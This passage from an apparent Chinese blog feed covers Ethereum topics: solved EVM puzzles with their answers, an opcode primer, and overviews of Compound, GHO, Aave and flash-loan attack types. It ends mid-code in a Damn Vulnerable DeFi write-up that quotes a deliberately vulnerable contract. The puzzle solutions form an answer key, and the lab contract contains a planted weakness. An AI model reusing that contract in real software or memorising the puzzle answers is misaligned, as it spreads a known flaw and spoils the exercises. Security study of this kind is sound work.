[0100，mul_result]</li><li>EQ：判断stack1和stack2是否相等，若相等，则清除这两个值，并向栈顶存入1，否则存入0</li><li>PUSH1 0C：STACK-&gt; [0C, 1]</li><li>JUMPI：读取stack2的值，如果为1，则跳转到stack1的位置，即0C，满足条件！<br>因此我们需要使得：0100 &#x3D; x*x，0x0100十进制为256，所以x &#x3D; 16，即value为16</li></ul><hr><h2 id="puzzles-6-CALLDATALOAD"><a href="#puzzles-6-CALLDATALOAD" class="headerlink" title="puzzles 6 CALLDATALOAD"></a>puzzles 6 CALLDATALOAD</h2><p>题目：</p><pre>pc      opcode  opcode name02      35        CALLDATALOAD04      FD        REVERT05      FD        REVERT06      FD        REVERT07      FD        REVERT08      FD        REVERT09      FD        REVERT0A      5B        JUMPDEST0B      00        STOP</pre><p>calldataload是 多少？</p><p>分析：</p><ul><li>PUSH1 00，STACK：【0x00】</li><li>CALLDATALOAD：获取input的数据，即calldata，参数为0x00，即从第00位置开始加载</li><li>JUMP想跳转到0A处，所以calldata的值为0x0a，如果我们直接输入0x0a，此时会被转化为：a00000000000000000000000000000000000000000000000000000000000000，这是错的；</li><li>由于calldata的数值总为32字节的倍数，所以此处应该为：0x000000000000000000000000000000000000000000000000000000000000000a</li></ul><hr><h2 id="puzzles-7-EXTCODESIZE"><a href="#puzzles-7-EXTCODESIZE" class="headerlink" title="puzzles 7 EXTCODESIZE"></a>puzzles 7 EXTCODESIZE</h2><p>题目：</p><pre>pc      opcode    opcode name00      36        CALLDATASIZE01      6000      PUSH1 0003      80        DUP104      37        CALLDATACOPY05      36        CALLDATASIZE06      6000      PUSH1 0008      6000      PUSH1 000A      F0        CREATE0B      3B        EXTCODESIZE0C      6001      PUSH1 010E      14        EQ0F      6013      PUSH1 1311      57        JUMPI12      FD        REVERT13      5B        JUMPDEST14      00        STOP</pre><p>calldata是多少？</p><p>分析：逐步分析，</p><pre>00      36        CALLDATASIZE    # [datasize]01      6000      PUSH1 00    # [00, datasize]03      80        DUP1        # [00, 00, datasize]04      37        CALLDATACOPY     # [] data被copy到memory中，栈被清空05      36        CALLDATASIZE    # [datasize]06      6000      PUSH1 00        # [00, datasize]08      6000      PUSH1 00        # [00, 00, datasize]0A      F0        CREATE    # [deployed_address] 栈被清空，从内存中读取数据，创建合约，返回地址 0B      3B        EXTCODESIZE    # [address_code_size] 输入地址，返回合约的size0C      6001      PUSH1 01    # [01, address_code_size]0E      14        EQ    # [1] address_code_size必须为1，后续的才成立0F      6013      PUSH1 1311      57        JUMPI12      FD        REVERT13      5B        JUMPDEST14      00        STOP</pre><p>就是我们传入的数据要的操作码要返回1，利用return操作符</p><pre>pc      opcode    opcode name00      6001      PUSH1 0104      F3        RETURN</pre><p>即 msg.data &#x3D;&#x3D; 0x60016000f3</p><hr><h2 id="puzzles-8-SWAP"><a href="#puzzles-8-SWAP" class="headerlink" title="puzzles 8 SWAP"></a>puzzles 8 SWAP</h2><p>题目：</p><pre>pc      opcode    opcode name00      36        CALLDATASIZE01      6000      PUSH1 0003      80        DUP104      37        CALLDATACOPY05      36        CALLDATASIZE06      6000      PUSH1 0008      6000      PUSH1 000A      F0        CREATE0B      6000      PUSH1 000D      80        DUP10E      80        DUP10F      80        DUP110      80        DUP111      94        SWAP512      5A        GAS13      F1        CALL14      6000      PUSH1 0016      14        EQ17      601B      PUSH1 1B19      57        JUMPI1A      FD        REVERT1B      5B        JUMPDEST1C      00        STOP</pre><p>calldata是多少？<br>分析：</p><pre>00      36        CALLDATASIZE    # [datasize]01      6000      PUSH1 00    # [00, datasize]03      80        DUP1    # [00, 00, datasize]04      37        CALLDATACOPY    # []  copy到内存中05      36        CALLDATASIZE    # [datasize]，直接生成数据，不需要栈参数06      6000      PUSH1 00    # [00, datasize]08      6000      PUSH1 00    # [00, 00, datasize]0A      F0        CREATE    # [deployed_address]0B      6000      PUSH1 00    # [00, deployed_address]0D      80        DUP1    # [00, 00, deployed_address]0E      80        DUP1    # [00, 00, 00, deployed_address]0F      80        DUP1    # [00, 00, 00, 00, deployed_address]10      80        DUP1    # [00, 00, 00, 00, 00, deployed_address]11      94        SWAP5    # [deployed_address, 00, 00, 00, 00, 00]，兑换1st 和 6th，你没有看错1和6，不是512      5A        GAS    # [gasAvail, deployed_address, 00, 00, 00, 00, 00] // 7个参数13      F1        CALL    # [0或1]调用函数，需要是0，0表示失败，1表示成功！（反推的14      6000      PUSH1 00    # [00, 0或1]，需要是016      14        EQ    # [0或1]，需要是117      601B      PUSH1 1B    # [1B, 0或1]，需要是119      57        JUMPI                       1A      FD        REVERT1B      5B        JUMPDEST1C      00        STOP</pre><p>逐步分析后，可得知我们需要做到call调用失败，这就要我们传入的数据revert,类似于puzzles#7</p><pre>pc      opcode    opcode name00      60FD      PUSH1 FD //FD 是revert操作符的编号02      6000      PUSH1 0004      53        MSTORE805      6001      PUSH1 0107      6000      PUSH1 0009      F3        RETURN</pre><p>即calldata&#x3D; 0x60fd60005360016000f3</p><hr><h2 id="puzzles-9-LT"><a href="#puzzles-9-LT" class="headerlink" title="puzzles 9 LT"></a>puzzles 9 LT</h2><pre>pc      opcode    opcode name00      36        CALLDATASIZE01      6003      PUSH1 0303      10        LT04      6009      PUSH1 0906      57        JUMPI07      FD        REVERT08      FD        REVERT09      5B        JUMPDEST0A      34        CALLVALUE0B      36        CALLDATASIZE0C      02        MUL0D      6008      PUSH1 080F      14        EQ10      6014      PUSH1 1412      57        JUMPI13      FD        REVERT14      5B        JUMPDEST15      00        STOP</pre><p>value?<br>calldata?</p><p>分析：就是一个推理题，00-09:datasize&gt;3,0A-12:value*datasize&#x3D;8,datasize&#x3D;4,value&#x3D;2<br>calldata的字节数为4，随意构造calldata&#x3D;0x12345678</p><hr><h2 id="puzzles-10-ISZERO"><a href="#puzzles-10-ISZERO" class="headerlink" title="puzzles 10 ISZERO"></a>puzzles 10 ISZERO</h2><p>题目：</p><pre>pc      opcode      opcode name00      38          CODESIZE01      34          CALLVALUE02      90          SWAP103      11          GT04      6008        PUSH1 0806      57          JUMPI07      FD          REVERT08      5B          JUMPDEST09      36          CALLDATASIZE0A      610003      PUSH2 00030D      90          SWAP10E      06          MOD0F      15          ISZERO10      34          CALLVALUE11      600A        PUSH1 0A13      01          ADD14      57          JUMPI15      FD          REVERT16      FD          REVERT17      FD          REVERT18      FD          REVERT19      5B          JUMPDEST1A      00          STOP</pre><p>value?<br>calldata?</p><p>分析：00-06：value&lt;23;09-0f:calldata mod 3&#x3D;&#x3D;0;10-14:value+0a&#x3D;19,注意19为16进制的数，value&#x3D;15,calldata的字节数为3，随意构造calldta&#x3D;0x123456</p><p>10道EVM puzzles就完成了！！！</p>]]></content>
      
      
      
        <tags>
            
            <tag> EVM </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>EVM入门</title>
      <link href="/2024/08/19/EVM%E5%85%A5%E9%97%A8/"/>
      <url>/2024/08/19/EVM%E5%85%A5%E9%97%A8/</url>
      
        <content type="html"><![CDATA[<h2 id="Opcodes"><a href="#Opcodes" class="headerlink" title="Opcodes"></a>Opcodes</h2><p>Opcodes（操作码）是以太坊智能合约的基本单元。我们写的Solidity智能合约会被编译为字节码（bytecode），然后才能在EVM（以太坊虚拟机）上运行。而字节码就是由一系列Opcodes组成的。当用户在EVM中调用这个智能合约的函数时，EVM会解析并执行这些Opcodes，以实现合约逻辑。</p><h2 id="常见的Opcodes"><a href="#常见的Opcodes" class="headerlink" title="常见的Opcodes"></a>常见的Opcodes</h2><p><code>PUSH1</code>: 将一个字节的数据压入堆栈。例如，PUSH1 0x60 就是将 0x60 压入堆栈。<br><code>DUP1</code> : 复制堆栈顶部的一个元素。<br><code>SWAP1</code>: 交换堆栈顶部的前两个元素。</p><p>例如：下面是一个简单的Solidity智能合约，它只有一个add()函数，计算1+1的结果并返回。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.20;</span><br><span class="line"></span><br><span class="line">contract Add &#123;</span><br><span class="line">    function add() public pure returns (uint256 result) &#123;</span><br><span class="line">        result = 1+1;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>将合约编译后，我们可以得到合约对应的bytecode:<strong>60806040523480156100…</strong></p><p>通过bytecode，我们可以得到合约对应的opcodes为:<strong>PUSH1 0x80 PUSH1 0x40 MSTORE CALLVALUE DUP1 …</strong></p><blockquote><p>我认为需要特别记忆的基本Opcodes:<br>PUSH1:将一个长度为1字节的数据压入堆栈顶部。同理可知：PUSH2就是压入长度为俩个字节的数据进入栈堆顶部<br>ADD:会弹出堆栈顶部的两个元素，计算它们的和，然后将结果压入堆栈。<br>PUSH0:就是将0压入栈堆<br>MUL: 会弹出堆栈顶部的两个元素，计算它们的乘，然后将结果压入堆栈。<br>SUB: 会弹出堆栈顶部的两个元素，第二个元素减去第一个元素，然后将结果压入堆栈<br>DUPx:就是复制第x个元素到栈顶<br>LT:从堆栈中弹出两个元素，比较第二个元素是否小于第一个元素。如果是，那么将1推入堆栈，否则将0推入堆栈。如果堆栈元素不足两个，那么会抛出异常。<br>GT:从堆栈中弹出两个元素，比较第二个元素是否大于第一个元素。如果是，那么将1推入堆栈，否则将0推入堆栈。如果堆栈元素不足两个，那么会抛出异常。<br>EQ:从堆栈中弹出两个元素，比较第二个元素是否等于第一个元素。如果是，那么将1推入堆栈，否则将0推入堆栈。如果堆栈元素不足两个，那么会抛出异常。<br>AND:从栈堆中弹出俩个元素,比较位级,如2(0000 0010)和3(0000 0011),则入栈的是2<br>OR:从栈堆中弹出俩个元素,比较位级,如2(0000 0010)和3(0000 0011),则入栈的是3<br>XOR:它是异或运算,,如2(0000 0010)和3(0000 0011),则入栈的是1(0000 0001),就是比较依次它们2进制的数,俩个0相遇或者俩个1相遇就为0,不同的相遇就为1<br>SHL:指令执行左移位操作，从堆栈中弹出两个元素，将第二个元素左移第一个元素位数，然后将结果推回栈顶。将2（0000 0010）和3（0000 0011）推入堆栈，然后将2左移3位，结果应该为16（0001 0000）。<br>SHR:同上,只不过向右移,字节码将16（0001 0000）和3（0000 0011）推入堆栈，然后将16右移3位，结果应该为2（0000 0010）。<br>MSTORE:指令用于将一个256位（32字节）的值存储到内存中。它从堆栈中弹出两个元素，第一个元素为内存的地址（偏移量 offset），第二个元素为存储的值（value）。<br>STOP:它的作用是停止当前上下文的执行，并成功退出。<br>JUMP:用于无条件跳转到一个新的程序计数器位置。它从堆栈中弹出一个元素，将这个元素设定为新的程序计数器（pc）的值。搭配JUMPDEST(标记一个有效的跳转目标位置)使用<br>JUMP1:用于条件跳转，它从堆栈中弹出两个元素，如果第二个元素（条件，condition）不为0，那么将第一个元素（目标，destination）设定为新的pc的值。<br>SWAP:交换,如SWAP1,交换栈顶与次栈顶,swap2,交换栈顶与第三个元素<br>CALLDATALOAD:从交易或合约调用的data字段加载数据。它从堆栈中弹出calldata的偏移量（offset），然后从calldata的offset位置读取32字节的数据并压入堆栈。如果calldata剩余不足32字节，则补0。<br>CALLDATASIZE:获取交易或合约调用的data字段的字节长度，并压入堆栈。<br>CALLDATACOPY:将data中的数据复制到内存中。它会从堆栈中弹出3个参数(mem_offset, calldata_offset, length)，分别对应写到内存的偏移量，读取calldata的偏移量和长度。<br>CODESIZE:获取当前合约代码的字节长度，然后压入堆栈。</p></blockquote><hr><h2 id="EVM基础"><a href="#EVM基础" class="headerlink" title="EVM基础"></a>EVM基础</h2><p>以太坊虚拟机（EVM）是以太坊区块链中的关键组件，充当开发人员的虚拟计算机或软件平台。这项创新允许创建和部署去中心化应用程序（DApp）以及在以太坊网络上执行智能合约。 EVM 由Vitalik Buterin于 2013 年提出概念，成为以太坊网络的核心，强调了其在决定以太坊区块链中每个区块的状态方面的基础作用。</p><p>EVM就是一个运行环境，就如同Java的运行环境一样，含义，分类都差不多，它包括了堆栈，内存，存储，EVM字节码，有一点编程基础的都知道堆栈，这种先进后出的结构，反正就是一个类似于JVM一样机器，它主要就是运行一些操作符opcode,真正的要理解熟悉opcode操作符，144个，<a href="https://www.evm.codes/?fork=shanghai">点击学习</a>,更多的详细指令参考<a href="https://www.wtf.academy/docs/evm-opcodes-101/">WTF</a>，我就不一一讲了，接下来就是大白话：</p><h2 id="优点"><a href="#优点" class="headerlink" title="优点"></a>优点</h2><ul><li>跨区块链支持：EVM 支持字节码兼容的智能合约的能力使其能够跨各种区块链。 Polygon 和 Avalanche 等多个区块链都利用了此功能，使它们能够利用 EVM 强大的生态系统。</li><li>隔离沙箱环境：EVM 在同一计算机网络内单独操作每个代码段，确保一个应用程序的执行不会影响区块链的其余部分或节点计算机上存储的数据。这种隔离有利于快速高效的开发。</li><li>灵活的开发能力：EVM 擅长执行复杂且定制的智能合约，这对于包括 dApp、 DeFi平台、游戏和NFT在内的各种应用程序至关重要。此外，EVM 周围有一个庞大的开发人员社区，简化了软件构建过程。</li><li>跨操作系统的交叉兼容性：由于区块链网络中 MacOS、Windows 等操作系统的多样性，开发兼容软件可能具有挑战性。 EVM 通过标准化并支持跨多个操作系统执行程序来解决这个问题，而无需单独的代码库。</li></ul><h2 id="缺点"><a href="#缺点" class="headerlink" title="缺点"></a>缺点</h2><ul><li>高交易成本（Gas 费） ：使用 EVM 最显着的缺点之一是加密 Gas费成本高昂。由于 EVM 的可扩展性限制，这些费用可能会迅速增加，尤其是在网络流量较高的时期。</li><li>可扩展性挑战：EVM 每秒只能处理有限数量的事务。这种限制可能会导致网络拥塞加剧，进一步推高汽油费。<br>部署智能合约的成本：以太坊的流行性质意味着部署自定义智能合约或更大的应用程序可能会成本高昂。开发人员必须优化其合约以提高效率，消除冗余代码或不必要的功能，并且还必须考虑以太坊区块链上的高存储成本。</li><li>智能合约的不可逆性：一旦部署，区块链上的智能合约就无法更改。如果在部署后发现错误或漏洞，则这种不变性会带来挑战，需要重新部署整个合约，这可能会产生额外的成本。</li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> EVM </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Compound</title>
      <link href="/2024/08/19/Compound/"/>
      <url>/2024/08/19/Compound/</url>
      
        <content type="html"><![CDATA[<h1 id="Compound"><a href="#Compound" class="headerlink" title="Compound"></a>Compound</h1><p>Compound是在Ethereum上运行的软件，旨在奖励分布式计算机网络运行传统货币市场。Compound允许用户将加密货币存入借贷池让借款人使用。而贷方从他们存入的资产赚取利息。 </p><p>存款后，Compound会奖励贷方名为cToken（代表存款）的新加密货币。cToken的例子包括cETH、cBAT以及cDAI。</p><p>每个cToken都可无限转让或交易，但只能兑换最初锁定在协议中的加密货币。整个过程由Compound代码自动处理，代表贷方可以随时提币。</p><p>为了激励这个行为，Compound使用了另一种称为COMP的自家加密货币。每当用户和Compound市场互动时（借入、提取或偿还资产），作为奖励他们都会获得额外的COMP代币。</p><p>简言之，Compound 是一个允许用户借贷代币的智能合约，它与你的银行类似，Compound 把你的钱借给借款人，并随着时间的推移赚取利息。但与银行不同的是，你的利息是从你存入 Compound 的智能合约后开始复利计算的。因为这是一个智能合约，整个流程中没有中间人，因此利息会比传统银行要高。</p><h2 id="运作机制"><a href="#运作机制" class="headerlink" title="运作机制"></a>运作机制</h2><p>Compound 协议让开发者可以基于以太坊建立各种各样的货币市场（money market）。<br>所谓的「货币市场」，其实就是一个个的独立币池单元，每个币池里只有一种代币，协议通过算法来决定这个池子里的币借贷的利率是多少。简单点说，这个算法会基于人们对这个币借贷的供需关系自动计算出利率。</p><p>不管你是来贷款还是放贷，你都是在跟 Compound 协议直接打交道。这一点跟那些点对点的借贷协议不太一样。在点对点的方案里，借贷双方会做匹配，然后你需要跟找你借钱的人（或者借你钱的人）进行沟通，双方自己商定好借款的利率、到期时间和抵押物品等等。</p><p>而在 Compound 协议里，每个代币（比如 Ether、Dai、USDC）都有一个属于自己的借贷市场，里面包含每个用户在这个市场里的余额，以及各笔生效的借贷交易，乃至每段时期的历史利率，等等。</p><p>用户可以通过抵押品的信贷额度无缝地从协议上借钱，你只需要看自己要借哪个币，不需要和别人沟通还款日期、利率，就能马上借钱。借款是实时且可预测的。每个货币市场都有一个由市场决定的浮动利率。</p><h2 id="清算保证"><a href="#清算保证" class="headerlink" title="清算保证"></a>清算保证</h2><p>Compound 协议强制应用了一条规则，即每个账户必须拥有足够的余额能够偿还借款的额度，叫做<strong>抵押率</strong>。每个账户无法做出任何会使「余额／借款额度」低于「抵押率」的行为。比如再借更多的钱或者把抵押款的余额提现。要增大或者重置抵押率，用户可以全额或者部分偿还借款。任何被 Compound 持有的余额，包括用户用来做抵押品的余额，同时也会产生正常的应计利息。</p><p>如果一个用户提供的抵押资产，除以他们信用额度所借的款项，低于抵押率，那他们的抵押资产就会（通过借款资产）被出售，出售的价格是当前市场价格减去清算折扣（liquidation discount）。这个机制会激励系统里的套利者，去快速减少借款人还不了的借款资产的短缺，从而降低协议的风险。</p>]]></content>
      
      
      
        <tags>
            
            <tag> 基础知识 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>GHO</title>
      <link href="/2024/08/19/GHO/"/>
      <url>/2024/08/19/GHO/</url>
      
        <content type="html"><![CDATA[<h1 id="GHO"><a href="#GHO" class="headerlink" title="GHO"></a>GHO</h1><p>它是 Aave 协议中唯一一个去中心化、超额抵押的稳定币，作为以太坊主网上的去中心化稳定币，GHO 由用户铸造。与 Aave 协议上的所有借贷一样，用户必须提供抵押品（按特定抵押品比率）才能铸造 GHO。相应地，当用户偿还借贷头寸（或被清算）时，GHO 将返回 Aave 池并被销毁。GHO 铸造者累积的所有利息支付将直接进入Aave DAO 金库，这与用户借入其他资产时收集的标准准备金因子形成鲜明对比，本金将被销毁。</p><p>人们对真正去中心化、超额抵押和可配置的稳定币的需求很大。最近的事件证明了去中心化稳定币在市场波动期间维持稳定价值的用例。GHO 是一种由 Aave Governance 控制的稳定币，在社区支持下，它有潜力成为 DeFi 生态系统持续增长不可或缺的一部分。</p><p>与许多稳定币不同，GHO 的预言机价格是固定的。GHO 等去中心化稳定币是透明的，无法更改。利率由 Aave DAO 定义，偿还的利息将重定向到 DAO 而不是资产供应商。在安全模块中质押 AAVE 的借款人可享受折扣。</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Aave学习知识</title>
      <link href="/2024/08/19/Aave%E5%AD%A6%E4%B9%A0%E7%9F%A5%E8%AF%86/"/>
      <url>/2024/08/19/Aave%E5%AD%A6%E4%B9%A0%E7%9F%A5%E8%AF%86/</url>
      
        <content type="html"><![CDATA[<h1 id="Aave"><a href="#Aave" class="headerlink" title="Aave"></a>Aave</h1><h2 id="Aave-1"><a href="#Aave-1" class="headerlink" title="Aave"></a>Aave</h2><p>是一种完全去中心化的、社区管理的协议，Aave 是芬兰语，意思是“幽灵”，最初于 2017 年 11 月推出时被称为 ETHLend。 ETHLend 是一个点对对点借贷系统。后来进行改进才是Aave，用户可以在其中借入和借出加密资产。协议的价值主张是创建一个可供任何拥有加密资产的人使用的替代去中心化资产货币市场。</p><h2 id="作用"><a href="#作用" class="headerlink" title="作用"></a>作用</h2><p>Aave 是一个借贷池系统，使用户可以选择借入、借出和赚取 20 种不同数字资产的利息，而无需中间人。</p><p>想要赚取利息的用户将存入他们想要借出的资金，然后将其收集到流动性池中。当借款人贷款时，他们从这些资金池中提取资金。贷方可以以任何他们认为合适的方式交易或转让这些代币。</p><p>Aave 发行两种类型的代币来促进此活动，$AAVE（原生代币）和 aTokens。<br>$AAVE 令牌有多种使用方式：<br>1，如果支付费用，$AAVE 的所有者可以选择在向公众发布贷款之前查看贷款。</p><p>2， 使用 $AAVE 作为抵押品的用户可以比使用任何其他数字资产借入的金额略多。</p><p>3，代币持有者可以在平台上质押 $AAVE，以获得大约 6% 的 APY 分配。</p><p>aTokens 代币：</p><p>1，这些代币在存款时铸造，赎回时销毁。</p><p>2，它们与存入 Aave 协议的基础资产的价值以 1:1 的比率挂钩。</p><p>3，aTokens 为贷方提供“收据”，允许他们收取存款利息。</p><h2 id="v4"><a href="#v4" class="headerlink" title="v4"></a>v4</h2><p>今年（2024）5月，Avara 公布 Aave V4 版本的升级计划，重点放在进一步提升 Aave 的流动性与资产利用率。Aave V4 版本引入了流动性溢价功能，这是一个根据抵押品风险状况调整借款利率。为每种资产分配风险因子，依据市场和外部风险因素动态调整。风险较低的资产（如以太坊），将享受更低的借贷利率，而风险较高的资产（如山寨币）则相对提高借贷成本。</p><p>Aave V4 版本通过引入一系列创新功能，优化了借贷相关的安全性与用户体验并简化了治理流程：</p><ul><li><p>智能账户和金库的设计大幅提升了用户体验，智能账户允许用户通过单一钱包管理多个仓位。而智能账户实现的金库功能允许用户不直接向流动性层提供抵押品的情况下借款，抵押品将在借款活跃或清算事件发生时被锁定，增加了用户交互的便捷性和安全性。</p></li><li><p>V4 版本还提出了动态风险配置，以在市场条件变化时调整风险参数。用户在借款时会与资产的当前配置关联，而新的资产配置则为新用户提供，避免了影响现有借款人。此外 V4 引入了自动退市机制，简化了资产下架过程。</p></li></ul><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>比银行更高级的银行，它就是一个pool,在这里可以进行存款与借款，方便，信任度高,作为去中心化金融（DeFi）借贷领域的领头羊，Aave 在资产利用率、市场占有率和交易量方面均显著领先于竞争对手，扮演着关键角色。然而，Aave 的领先地位并非不可动摇。协议如 Radiant 和 Compound 已展示出强劲的增长潜力，并推出了具有增长潜力的新版本。为了巩固其市场地位，Aave 可以采取以下策略：加强其核心借贷业务，推动 GHO 的进一步发展并于 Aave 充分融合，建立 V4 版本所设计的 Aave Network ，以及拓展其非借贷业务生态。</p>]]></content>
      
      
      
        <tags>
            
            <tag> 基础知识 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>闪电贷</title>
      <link href="/2024/08/07/%E9%97%AA%E7%94%B5%E8%B4%B7/"/>
      <url>/2024/08/07/%E9%97%AA%E7%94%B5%E8%B4%B7/</url>
      
        <content type="html"><![CDATA[<h1 id="闪电贷"><a href="#闪电贷" class="headerlink" title="闪电贷"></a>闪电贷</h1><p>闪电贷（Flash loan）：是一种无抵押、借贷金额无上限（可以借光池中所有的钱）的贷款。它要求借贷人快借快还，快到还款和借款在同一个交易内（同一个以太坊 transaction),在我看来就是非常迅速的借款还款</p><p>首先你要借钱的话，你要写个还钱合约，里面包括了如何赚钱，还本金加利息的数目，开始借款的话，就要实现一个flashloan()闪电贷合约，这个合约首先要先进行一系列的数据验证，再调用你的还钱合约，验证你是否还了本金加利息，如果没有还上，直接 revert 整个交易，让借款无效，从而保证借出方总是安全的。实现闪电贷通常有俩个合约。</p><p>闪电贷的优点：编写闪电贷合约总体并不复杂。使用闪电贷风险也比较小。如果赚钱逻辑失败，变成了亏钱逻辑，不能完成还款，那么也不用担心借来的巨款无力偿还。整个交易将会执行失败，就如同借款从来没有发生过一样。</p><p><a href="https://www.learnblockchain.cn/article/1926">实现你第一笔闪电贷合约</a><br><a href="https://github.com/AmazingAng/WTF-Solidity/blob/main/57_Flashloan/readme.md">闪电贷的极简入门</a><br>下面是AI生成</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">## 闪电贷</span><br><span class="line">### 同一个区块中提款可导致闪电贷攻击</span><br><span class="line">攻击者利用闪电贷的特性，在同一个区块内执行多个交易，以迅速操控市场，并从中获利，闪电贷本身就是一笔交易完成的，如果允许在同一个区块上进行提款操作，那么就正好满足攻击者的需求了</span><br><span class="line">### 闪电贷可能会操纵ERC4626</span><br><span class="line">ERC4626，即代币化的金库标准，如果底层机制没有充分考虑此类威胁，则可能容易受到闪电贷攻击。例如ERC4626没有内置的保护功能，那么闪电贷可能利用快速冻结操作</span><br><span class="line"></span><br><span class="line">闪电贷（Flash Loan）是一种新兴的金融工具，允许用户在不需要抵押物的情况下借入大量资金，但必须在同一交易中偿还。这种机制最初由去中心化金融（DeFi）平台引入，为交易者提供了灵活性和机会。然而，闪电贷也可能被利用来进行攻击，形成所谓的“闪电贷攻击”。以下是对闪电贷借贷漏洞的细分描述：</span><br><span class="line">1. 闪电贷的基本原理</span><br><span class="line"></span><br><span class="line">1.借贷过程：用户在去中心化交易所（如Aave或 dYdX）申请借款，借款不需要抵押物，但必须在同一交易区块内还款。</span><br><span class="line">2.短期性：借款的时间极短，通常在几秒钟内完成。</span><br><span class="line">3.应用场景：可以用于套利、清算其他借贷、快速交易等。</span><br><span class="line"></span><br><span class="line">2. 闪电贷攻击的类型</span><br><span class="line">a. 套利攻击</span><br><span class="line"></span><br><span class="line">4.概念：借款者利用价格差异在不同平台上进行套利。</span><br><span class="line">5.示例：攻击者在一个交易所低价购买资产，然后在另一个交易所高价出售，以此获取利润。</span><br><span class="line"></span><br><span class="line">b. 价格操控</span><br><span class="line"></span><br><span class="line">6.概念：攻击者利用闪电贷大量借入资产并瞬间买入或卖出，操纵市场价格。</span><br><span class="line">7.示例：通过大规模购买某种代币推高其价格，然后在高价位出售所持代币，导致价格回落，形成利润。</span><br><span class="line"></span><br><span class="line">c. 清算攻击</span><br><span class="line"></span><br><span class="line">8.概念：借款者在去中心化借贷平台上利用闪电贷清算其他用户的抵押资产。</span><br><span class="line">9.示例：当某个用户的抵押物价值降低到一定程度，攻击者可以借入资金清算该用户的抵押物，以获得折扣资产。</span><br><span class="line"></span><br><span class="line">3. 闪电贷漏洞的成因</span><br><span class="line">a. 缺乏抵押要求</span><br><span class="line"></span><br><span class="line">10.问题：由于不需要抵押物，攻击者可以在短时间内借入大量资金。</span><br><span class="line">11.后果：使得平台的风险管理机制受到挑战。</span><br><span class="line"></span><br><span class="line">b. 市场价格不稳定</span><br><span class="line"></span><br><span class="line">12.问题：去中心化市场的流动性和价格稳定性较差，容易受到操控。</span><br><span class="line">13.后果：导致价格瞬间波动，从而为套利提供机会。</span><br><span class="line"></span><br><span class="line">c. 智能合约漏洞</span><br><span class="line"></span><br><span class="line">14.问题：智能合约可能存在代码缺陷或安全漏洞，攻击者可以利用这些缺陷执行恶意操作。</span><br><span class="line">15.后果：可能导致资产损失或协议失效。</span><br><span class="line"></span><br><span class="line">4. 防范措施</span><br><span class="line"></span><br><span class="line">16.审计智能合约：定期进行代码审计，以发现和修复潜在漏洞。</span><br><span class="line">17.流动性管理：加强市场流动性管理，避免价格剧烈波动。</span><br><span class="line">18.增加抵押要求：在某些情况下，考虑增加最低抵押要求，以降低风险。</span><br><span class="line"></span><br><span class="line">5. 总结</span><br><span class="line">闪电贷为DeFi生态系统带来了新的机遇，但也伴随着相应的风险。了解闪电贷的机制和潜在攻击方式，对于用户和开发者而言，都是至关重要的。通过合理的风险控制措施，可以在一定程度上减轻闪电贷带来的安全隐患。</span><br></pre></td></tr></table></figure><h3 id="用户处于无法还清贷款状态"><a href="#用户处于无法还清贷款状态" class="headerlink" title="用户处于无法还清贷款状态"></a>用户处于无法还清贷款状态</h3><p>某些情况或条件可能会阻止用户偿还贷款，从而导致他们永远负债累累。这可能是由于过度抵押、高额费用、代币价值波动或其他不可预见的事件等因素造成的。</p><h3 id="借出借入相同的代币"><a href="#借出借入相同的代币" class="headerlink" title="借出借入相同的代币"></a>借出借入相同的代币</h3><p>允许在单笔交易中借出和借入相同代币的协议可能容易受到利用快速价格通胀或闪电贷来操纵系统的攻击。</p><h3 id="自我清算"><a href="#自我清算" class="headerlink" title="自我清算"></a>自我清算</h3><p>1，自我清算的利润漏洞可能导致潜在的系统滥用和意想不到的财务后果。<br>2，如果暂停清算，会增加偿付能力风险，并导致复牌后出现不可预测的行为。<br>3，可能存在清算人厚道的金额低于预期情况，影响系统的稳定性</p><h3 id=""><a href="#" class="headerlink" title=""></a></h3>]]></content>
      
      
      
        <tags>
            
            <tag> 基本知识 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>damn-vulnerable-defi题解</title>
      <link href="/2024/08/06/damn-vulnerable-defi%E9%A2%98%E8%A7%A3/"/>
      <url>/2024/08/06/damn-vulnerable-defi%E9%A2%98%E8%A7%A3/</url>
      
        <content type="html"><![CDATA[<h1 id="Damn-vulnerable-defi"><a href="#Damn-vulnerable-defi" class="headerlink" title="Damn-vulnerable-defi"></a><a href="https://www.damnvulnerabledefi.xyz/">Damn-vulnerable-defi</a></h1><h2 id="Unstoppable"><a href="#Unstoppable" class="headerlink" title="Unstoppable"></a>Unstoppable</h2><p>要求是，使拥有一百万DVI的钱包停止闪电贷的功能</p><p>分析：这个合约的代码在gittub上，要分开去看，这道题的解决就是靠一个基本的闪电贷的知识<br>首先要看闪电贷的函数</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function flashLoan(IERC3156FlashBorrower receiver, address _token, uint256 amount, bytes calldata data)</span><br><span class="line">       external</span><br><span class="line">       returns (bool)</span><br><span class="line">   &#123;</span><br><span class="line">       if (amount == 0) revert InvalidAmount(0); // fail early</span><br><span class="line">       if (address(asset) != _token) revert UnsupportedCurrency(); // enforce ERC3156 requirement</span><br><span class="line">       uint256 balanceBefore = totalAssets();</span><br><span class="line">       if (convertToShares(totalSupply) != balanceBefore) revert InvalidBalance(); // enforce ERC4626 requirement</span><br><span class="line"></span><br><span class="line">       // transfer tokens out + execute callback on receiver</span><br><span class="line">       ERC20(_token).safeTransfer(address(receiver), amount);</span><br><span class="line"></span><br><span class="line">       // callback must return magic value, otherwise assume it failed</span><br><span class="line">       uint256 fee = flashFee(_token, amount);</span><br><span class="line">       if (</span><br><span class="line">           receiver.onFlashLoan(msg.sender, address(asset), amount, fee, data)</span><br><span class="line">               != keccak256(&quot;IERC3156FlashBorrower.onFlashLoan&quot;)</span><br><span class="line">       ) &#123;</span><br><span class="line">           revert CallbackFailed();</span><br><span class="line">       &#125;</span><br><span 